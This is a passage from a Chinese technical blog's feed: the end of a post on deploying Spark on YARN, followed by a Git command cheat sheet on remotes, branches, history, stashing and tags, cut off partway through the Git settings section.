集群模式运行&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;./bin/spark-submit \&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  --&lt;span class=&quot;class&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;org&lt;/span&gt;.&lt;span class=&quot;title&quot;&gt;apache&lt;/span&gt;.&lt;span class=&quot;title&quot;&gt;spark&lt;/span&gt;.&lt;span class=&quot;title&quot;&gt;examples&lt;/span&gt;.&lt;span class=&quot;title&quot;&gt;SparkPi&lt;/span&gt; \&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  --master &lt;span class=&quot;symbol&quot;&gt;spark:&lt;/span&gt;/&lt;span class=&quot;regexp&quot;&gt;/master:7077 \&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  lib/spark&lt;/span&gt;-examples-&lt;span class=&quot;number&quot;&gt;1.3&lt;/span&gt;.&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;-hadoop2.&lt;span class=&quot;number&quot;&gt;4.0&lt;/span&gt;.jar \&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;number&quot;&gt;100&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#Spark on YARN 集群上 yarn-cluster 模式运行&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;./bin/spark-submit \&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    --&lt;span class=&quot;class&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;org&lt;/span&gt;.&lt;span class=&quot;title&quot;&gt;apache&lt;/span&gt;.&lt;span class=&quot;title&quot;&gt;spark&lt;/span&gt;.&lt;span class=&quot;title&quot;&gt;examples&lt;/span&gt;.&lt;span class=&quot;title&quot;&gt;SparkPi&lt;/span&gt; \&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    --master yarn-cluster \  &lt;span class=&quot;comment&quot;&gt;# can also be `yarn-client`&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;class&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;lib&lt;/span&gt;/&lt;span class=&quot;title&quot;&gt;spark&lt;/span&gt;-&lt;span class=&quot;title&quot;&gt;examples&lt;/span&gt;*.&lt;span class=&quot;title&quot;&gt;jar&lt;/span&gt; \&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;number&quot;&gt;10&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;注意 Spark on YARN 支持两种运行模式，分别为&lt;code&gt;yarn-cluster&lt;/code&gt;和&lt;code&gt;yarn-client&lt;/code&gt;，具体的区别可以看&lt;a href=&quot;http://www.iteblog.com/archives/1223&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;这篇博文&lt;/a&gt;，从广义上讲，yarn-cluster适用于生产环境；而yarn-client适用于交互和调试，也就是希望快速地看到application的输出。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      最近毕设需要用到 Spark 集群，所以就记录下了部署的过程。我们知道 Spark 官方提供了三种集群部署方案： Standalone, Mesos, YARN。其中 Standalone 最为方便，本文主要讲述结合 YARN 的部署方案。
    
    </summary>
    
      <category term="分布式系统" scheme="http://wuchong.me/categories/%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F/"/>
    
    
      <category term="Spark" scheme="http://wuchong.me/tags/Spark/"/>
    
  </entry>
  
  <entry>
    <title>Git 常用技能</title>
    <link href="http://wuchong.me/blog/2015/03/30/git-useful-skills/"/>
    <id>http://wuchong.me/blog/2015/03/30/git-useful-skills/</id>
    <published>2015-03-30T02:39:39.000Z</published>
    <updated>2016-08-03T03:22:17.000Z</updated>
    
    <content type="html">&lt;p&gt;学习使用 Git 已经一年有余，一些常用技能也用的炉火纯青了，但偶尔碰到一些生僻的技能，总是需要去 Google，第二次用时又忘了。所以这是一篇我自认为比较重要的 Git 技能表，主要供自己查阅使用，反复查阅能够加深印象，提升技能熟练度。如果你是还不知道 Git 是什么，建议先阅读 &lt;a href=&quot;http://www.liaoxuefeng.com/wiki/0013739516305929606dd18361248578c67b8067c8c017b000&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;廖雪峰的Git教程&lt;/a&gt;。&lt;/p&gt;
&lt;h2 id=&quot;工作流&quot;&gt;&lt;a href=&quot;#工作流&quot; class=&quot;headerlink&quot; title=&quot;工作流&quot;&gt;&lt;/a&gt;工作流&lt;/h2&gt;&lt;p&gt;Git 最核心的一个概念就是工作流。工作区(Workspace)是电脑中实际的目录；暂存区(Index)像个缓存区域，临时保存你的改动；最后是版本库(Repository)，分为本地仓库和远程仓库。下图真是一图胜千言啊，就无耻盗图了。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://ww4.sinaimg.cn/mw690/81b78497jw1eqnk1bkyaij20e40bpjsm.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h2 id=&quot;远程仓库&quot;&gt;&lt;a href=&quot;#远程仓库&quot; class=&quot;headerlink&quot; title=&quot;远程仓库&quot;&gt;&lt;/a&gt;远程仓库&lt;/h2&gt;&lt;h3 id=&quot;添加远程仓库&quot;&gt;&lt;a href=&quot;#添加远程仓库&quot; class=&quot;headerlink&quot; title=&quot;添加远程仓库&quot;&gt;&lt;/a&gt;添加远程仓库&lt;/h3&gt;&lt;figure class=&quot;highlight applescript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;git remote add origin git@server-&lt;span class=&quot;built_in&quot;&gt;name&lt;/span&gt;:path/repo-&lt;span class=&quot;built_in&quot;&gt;name&lt;/span&gt;.git  &lt;span class=&quot;comment&quot;&gt;#添加一个远程库&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;查看远程仓库&quot;&gt;&lt;a href=&quot;#查看远程仓库&quot; class=&quot;headerlink&quot; title=&quot;查看远程仓库&quot;&gt;&lt;/a&gt;查看远程仓库&lt;/h3&gt;&lt;figure class=&quot;highlight nginx&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attribute&quot;&gt;git&lt;/span&gt; remote      &lt;span class=&quot;comment&quot;&gt;#要查看远程库的信息&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;git remote -v   &lt;span class=&quot;comment&quot;&gt;#显示更详细的信息&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;推送分支&quot;&gt;&lt;a href=&quot;#推送分支&quot; class=&quot;headerlink&quot; title=&quot;推送分支&quot;&gt;&lt;/a&gt;推送分支&lt;/h3&gt;&lt;figure class=&quot;highlight crmsh&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;git push origin &lt;span class=&quot;keyword&quot;&gt;master&lt;/span&gt;    &lt;span class=&quot;title&quot;&gt;#推送到远程master&lt;/span&gt;分支&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;抓取分支&quot;&gt;&lt;a href=&quot;#抓取分支&quot; class=&quot;headerlink&quot; title=&quot;抓取分支&quot;&gt;&lt;/a&gt;抓取分支&lt;/h3&gt;&lt;figure class=&quot;highlight crmsh&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;git &lt;span class=&quot;keyword&quot;&gt;clone&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;git&lt;/span&gt;@server-name:path/repo-name.git   &lt;span class=&quot;comment&quot;&gt;#克隆远程仓库到本地(能看到master分支)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;git checkout -b dev origin/dev  &lt;span class=&quot;comment&quot;&gt;#创建远程origin的dev分支到本地，并命名为dev&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;git checkout origin/dev --track &lt;span class=&quot;comment&quot;&gt;#与上面效果一样&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;git pull origin &lt;span class=&quot;keyword&quot;&gt;master&lt;/span&gt;          &lt;span class=&quot;title&quot;&gt;#从远程分支进行更新 &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;git&lt;/span&gt; fetch origin &lt;span class=&quot;keyword&quot;&gt;master&lt;/span&gt;         &lt;span class=&quot;title&quot;&gt;#获取远程分支上的数据&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;抓取GitHub上某个pull-request到本地&quot;&gt;&lt;a href=&quot;#抓取GitHub上某个pull-request到本地&quot; class=&quot;headerlink&quot; title=&quot;抓取GitHub上某个pull request到本地&quot;&gt;&lt;/a&gt;抓取GitHub上某个pull request到本地&lt;/h3&gt;&lt;figure class=&quot;highlight groovy&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;git fetch origin pull&lt;span class=&quot;regexp&quot;&gt;/ID/&lt;/span&gt;&lt;span class=&quot;string&quot;&gt;head:&lt;/span&gt;BRANCHNAME&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;git checkout BRANCHNAME&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;code&gt;$ git branch --set-upstream branch-name origin/branch-name&lt;/code&gt;，可以建立起本地分支和远程分支的关联，之后可以直接&lt;code&gt;git pull&lt;/code&gt;从远程抓取分支。&lt;/p&gt;
&lt;p&gt;另外，&lt;code&gt;git pull&lt;/code&gt; = &lt;code&gt;git fetch&lt;/code&gt; + &lt;code&gt;merge&lt;/code&gt; to local&lt;/p&gt;
&lt;h3 id=&quot;删除远程分支&quot;&gt;&lt;a href=&quot;#删除远程分支&quot; class=&quot;headerlink&quot; title=&quot;删除远程分支&quot;&gt;&lt;/a&gt;删除远程分支&lt;/h3&gt;&lt;figure class=&quot;highlight armasm&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$ git &lt;span class=&quot;keyword&quot;&gt;push &lt;/span&gt;origin --delete &lt;span class=&quot;keyword&quot;&gt;bugfix&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;span class=&quot;symbol&quot;&gt;To&lt;/span&gt; https://github.com/wuchong/jacman&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; - [deleted]         &lt;span class=&quot;keyword&quot;&gt;bugfix&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;# 或者直接&lt;span class=&quot;keyword&quot;&gt;push一个空分支&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;$ git &lt;span class=&quot;keyword&quot;&gt;push &lt;/span&gt;origin :&lt;span class=&quot;keyword&quot;&gt;bugfix&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;span class=&quot;symbol&quot;&gt;To&lt;/span&gt; https://github.com/wuchong/jacman&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; - [deleted]         &lt;span class=&quot;keyword&quot;&gt;bugfix&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;更新远程分支信息&quot;&gt;&lt;a href=&quot;#更新远程分支信息&quot; class=&quot;headerlink&quot; title=&quot;更新远程分支信息&quot;&gt;&lt;/a&gt;更新远程分支信息&lt;/h3&gt;&lt;p&gt;项目往前推进的过程中，远程仓库上经常会增加一些分支、删除一些分支。 所以有时需要与远程同步下分支信息。&lt;/p&gt;
&lt;figure class=&quot;highlight nginx&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attribute&quot;&gt;git&lt;/span&gt; fetch -p&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;code&gt;-p&lt;/code&gt;就是修剪的意思。它在fetch之后删除掉没有与远程分支对应的本地分支，并且同步一些远程新创建的分支和tag。&lt;/p&gt;
&lt;h2 id=&quot;历史管理&quot;&gt;&lt;a href=&quot;#历史管理&quot; class=&quot;headerlink&quot; title=&quot;历史管理&quot;&gt;&lt;/a&gt;历史管理&lt;/h2&gt;&lt;h3 id=&quot;查看历史&quot;&gt;&lt;a href=&quot;#查看历史&quot; class=&quot;headerlink&quot; title=&quot;查看历史&quot;&gt;&lt;/a&gt;查看历史&lt;/h3&gt;&lt;figure class=&quot;highlight applescript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;git &lt;span class=&quot;built_in&quot;&gt;log&lt;/span&gt; &lt;span class=&quot;comment&quot;&gt;--pretty=oneline filename #一行显示&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;git &lt;span class=&quot;built_in&quot;&gt;log&lt;/span&gt; -p &lt;span class=&quot;number&quot;&gt;-2&lt;/span&gt;      &lt;span class=&quot;comment&quot;&gt;#显示最近2次提交内容的差异&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;git show cb926e7   &lt;span class=&quot;comment&quot;&gt;#查看某次修改&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;版本回退&quot;&gt;&lt;a href=&quot;#版本回退&quot; class=&quot;headerlink&quot; title=&quot;版本回退&quot;&gt;&lt;/a&gt;版本回退&lt;/h3&gt;&lt;figure class=&quot;highlight perl&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;git &lt;span class=&quot;keyword&quot;&gt;reset&lt;/span&gt; --hard HEAD^    &lt;span class=&quot;comment&quot;&gt;#回退到上一个版本&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;git &lt;span class=&quot;keyword&quot;&gt;reset&lt;/span&gt; --hard cb926e7  &lt;span class=&quot;comment&quot;&gt;#回退到具体某个版&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;git reflog                &lt;span class=&quot;comment&quot;&gt;#查看命令历史,常用于帮助找回丢失掉的commit&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;用HEAD表示当前版本，上一个版本就是&lt;code&gt;HEAD^&lt;/code&gt;，上上一个版本就是&lt;code&gt;HEAD^^&lt;/code&gt;，&lt;code&gt;HEAD~100&lt;/code&gt;就是上100个版本。&lt;/p&gt;
&lt;h2 id=&quot;管理修改&quot;&gt;&lt;a href=&quot;#管理修改&quot; class=&quot;headerlink&quot; title=&quot;管理修改&quot;&gt;&lt;/a&gt;管理修改&lt;/h2&gt;&lt;figure class=&quot;highlight dts&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;git status              &lt;span class=&quot;meta&quot;&gt;#查看工作区、暂存区的状态&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;git checkout -- &lt;span class=&quot;params&quot;&gt;&amp;lt;file&amp;gt;&lt;/span&gt;  &lt;span class=&quot;meta&quot;&gt;#丢弃工作区上某个文件的修改&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;git reset HEAD &lt;span class=&quot;params&quot;&gt;&amp;lt;file&amp;gt;&lt;/span&gt;   &lt;span class=&quot;meta&quot;&gt;#丢弃暂存区上某个文件的修改，重新放回工作区&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;查看差异&quot;&gt;&lt;a href=&quot;#查看差异&quot; class=&quot;headerlink&quot; title=&quot;查看差异&quot;&gt;&lt;/a&gt;查看差异&lt;/h3&gt;&lt;figure class=&quot;highlight mipsasm&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;git &lt;span class=&quot;keyword&quot;&gt;diff &lt;/span&gt;             &lt;span class=&quot;comment&quot;&gt;#查看未暂存的文件更新 &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;git &lt;span class=&quot;keyword&quot;&gt;diff &lt;/span&gt;--&lt;span class=&quot;keyword&quot;&gt;cached &lt;/span&gt;    &lt;span class=&quot;comment&quot;&gt;#查看已暂存文件的更新 &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;git &lt;span class=&quot;keyword&quot;&gt;diff &lt;/span&gt;HEAD -- readme.txt  &lt;span class=&quot;comment&quot;&gt;#查看工作区和版本库里面最新版本的区别&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;git &lt;span class=&quot;keyword&quot;&gt;diff &lt;/span&gt;&amp;lt;source_branch&amp;gt; &amp;lt;target_branch&amp;gt;  &lt;span class=&quot;comment&quot;&gt;#在合并改动之前，预览两个分支的差异&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;使用内建的图形化git：&lt;code&gt;gitk&lt;/code&gt;，可以更方便清晰地查看差异。当然 Github 客户端也不错。&lt;/p&gt;
&lt;h3 id=&quot;删除文件&quot;&gt;&lt;a href=&quot;#删除文件&quot; class=&quot;headerlink&quot; title=&quot;删除文件&quot;&gt;&lt;/a&gt;删除文件&lt;/h3&gt;&lt;figure class=&quot;highlight dts&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;git rm &lt;span class=&quot;params&quot;&gt;&amp;lt;file&amp;gt;&lt;/span&gt;           &lt;span class=&quot;meta&quot;&gt;#直接删除文件&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;git rm --cached &lt;span class=&quot;params&quot;&gt;&amp;lt;file&amp;gt;&lt;/span&gt;  &lt;span class=&quot;meta&quot;&gt;#删除文件暂存状态&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;储藏和恢复&quot;&gt;&lt;a href=&quot;#储藏和恢复&quot; class=&quot;headerlink&quot; title=&quot;储藏和恢复&quot;&gt;&lt;/a&gt;储藏和恢复&lt;/h3&gt;&lt;figure class=&quot;highlight applescript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;git stash           &lt;span class=&quot;comment&quot;&gt;#储藏当前工作&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;git stash &lt;span class=&quot;built_in&quot;&gt;list&lt;/span&gt;      &lt;span class=&quot;comment&quot;&gt;#查看储藏的工作现场&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;git stash apply     &lt;span class=&quot;comment&quot;&gt;#恢复工作现场，stash内容并不删除&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;git stash pop       &lt;span class=&quot;comment&quot;&gt;#恢复工作现场，并删除stash内容&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;分支管理&quot;&gt;&lt;a href=&quot;#分支管理&quot; class=&quot;headerlink&quot; title=&quot;分支管理&quot;&gt;&lt;/a&gt;分支管理&lt;/h2&gt;&lt;h3 id=&quot;创建分支&quot;&gt;&lt;a href=&quot;#创建分支&quot; class=&quot;headerlink&quot; title=&quot;创建分支&quot;&gt;&lt;/a&gt;创建分支&lt;/h3&gt;&lt;figure class=&quot;highlight crmsh&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;git branch develop              &lt;span class=&quot;comment&quot;&gt;#只创建分支&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;git checkout -b &lt;span class=&quot;keyword&quot;&gt;master&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;develop&lt;/span&gt;  &lt;span class=&quot;comment&quot;&gt;#创建并切换到 develop 分支&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;合并分支&quot;&gt;&lt;a href=&quot;#合并分支&quot; class=&quot;headerlink&quot; title=&quot;合并分支&quot;&gt;&lt;/a&gt;合并分支&lt;/h3&gt;&lt;figure class=&quot;highlight crmsh&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;git checkout &lt;span class=&quot;keyword&quot;&gt;master&lt;/span&gt;         &lt;span class=&quot;title&quot;&gt;#切换到主分支&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;git&lt;/span&gt; merge --no-ff develop   &lt;span class=&quot;comment&quot;&gt;#把 develop 合并到 master 分支，no-ff 选项的作用是保留原分支记录&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;git branch -d develop       &lt;span class=&quot;comment&quot;&gt;#删除 develop 分支&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;标签&quot;&gt;&lt;a href=&quot;#标签&quot; class=&quot;headerlink&quot; title=&quot;标签&quot;&gt;&lt;/a&gt;标签&lt;/h2&gt;&lt;h3 id=&quot;显示标签&quot;&gt;&lt;a href=&quot;#显示标签&quot; class=&quot;headerlink&quot; title=&quot;显示标签&quot;&gt;&lt;/a&gt;显示标签&lt;/h3&gt;&lt;figure class=&quot;highlight crmsh&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;git &lt;span class=&quot;keyword&quot;&gt;tag&lt;/span&gt;         &lt;span class=&quot;title&quot;&gt;#列出现有标签 &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;git&lt;/span&gt; show &lt;span class=&quot;tag&quot;&gt;&amp;lt;tagname&amp;gt;&lt;/span&gt;  &lt;span class=&quot;comment&quot;&gt;#显示标签信息&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;###创建标签&lt;br&gt;&lt;figure class=&quot;highlight crmsh&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;git &lt;span class=&quot;keyword&quot;&gt;tag&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;v0&lt;/span&gt;.&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;    &lt;span class=&quot;comment&quot;&gt;#新建标签，默认位 HEAD&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;git &lt;span class=&quot;keyword&quot;&gt;tag&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;v0&lt;/span&gt;.&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt; cb926e7  &lt;span class=&quot;comment&quot;&gt;#对指定的 commit id 打标签&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;git &lt;span class=&quot;keyword&quot;&gt;tag&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;-a&lt;/span&gt; v0.&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt; -m &#39;&lt;span class=&quot;keyword&quot;&gt;version&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;0.1&lt;/span&gt; released&#39;   &lt;span class=&quot;comment&quot;&gt;#新建带注释标签&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&quot;操作标签&quot;&gt;&lt;a href=&quot;#操作标签&quot; class=&quot;headerlink&quot; title=&quot;操作标签&quot;&gt;&lt;/a&gt;操作标签&lt;/h3&gt;&lt;figure class=&quot;highlight elixir&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;git checkout &amp;lt;tagname&amp;gt;        &lt;span class=&quot;comment&quot;&gt;#切换到标签&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;git push origin &amp;lt;tagname&amp;gt;     &lt;span class=&quot;comment&quot;&gt;#推送分支到源上&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;git push origin --tags        &lt;span class=&quot;comment&quot;&gt;#一次性推送全部尚未推送到远程的本地标签&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;git tag -d &amp;lt;tagname&amp;gt;          &lt;span class=&quot;comment&quot;&gt;#删除标签&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;git push origin &lt;span class=&quot;symbol&quot;&gt;:refs/tags/&amp;lt;tagname&amp;gt;&lt;/span&gt;      &lt;span class=&quot;comment&quot;&gt;#删除远程标签&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;Git-设置&quot;&gt;&lt;a href=&quot;#Git-设置&quot; class=&quot;headerlink&quot; title=&quot;Git 设置&quot;&gt;&lt;/a&gt;Git 设置&lt;/h2&gt;&lt;p&gt;设置 commit 的用户和邮箱&lt;/p&gt;
&lt;figure class=&quot;highlight arduino&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;git &lt;span class=&quot;built_in&quot;&gt;config&lt;/span&gt; user.name &lt;span class=&quot;string&quot;&gt;&quot;xx&quot;&lt;/span&gt;               &lt;span class=&quot;meta&quot;&gt;#设置 commit 的用户&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;git &lt;span class=&quot;built_in&quot;&gt;config&lt;/span&gt; user.email &lt;span class=&quot;string&quot;&gt;&quot;xx@xx.com&quot;&lt;/span&gt;       &lt;span class=&quot;meta&quot;&gt;#设置 commit 的邮箱&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;git commit --amend --author &lt;span class=&quot;string&quot;&gt;&quot;Jark Wu &amp;lt;imjark@gmail.com&amp;gt;&quot;&lt;/span&gt;    &lt;span 